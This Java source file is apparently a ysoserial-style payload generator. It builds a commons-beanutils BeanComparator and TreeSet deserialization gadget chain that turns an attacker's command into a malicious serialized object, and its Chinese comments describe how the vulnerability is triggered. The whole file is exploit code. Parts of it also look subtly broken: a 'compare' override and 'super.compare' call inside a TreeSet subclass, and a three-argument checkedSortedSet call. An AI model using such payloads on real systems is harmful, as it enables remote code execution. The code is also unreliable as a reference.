import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.Serializable;
import java.util.Collections;
import java.util.SortedSet;
import java.util.TreeSet;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({Authors.FROHOFF})
public class CommonsBeanutilsTreeSet implements ObjectPayload<Object> {

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutilsTreeSet.class, args);
    }

    public Object getObject(final String command) throws Exception {
        // 创建一个可以触发反序列化漏洞的 Serializable 对象
        final Serializable payload = Gadgets.createPayloadObject(command);

        // 创建一个 TreeSet 并添加恶意的 payload 对象
        final SortedSet<Object> set = new TreeSet<Object>(new BeanComparator()) {
            // 重写 compare 方法以触发漏洞
            public int compare(Object o1, Object o2) {
                // 这里可以调用 payload 的任意方法来触发漏洞
                // 例如：payload.toString();
                return super.compare(o1, o2);
            }
        };
        set.add(payload); // 添加 payload 到 TreeSet

        return Collections.checkedSortedSet(set, Object.class, null);
    }
}
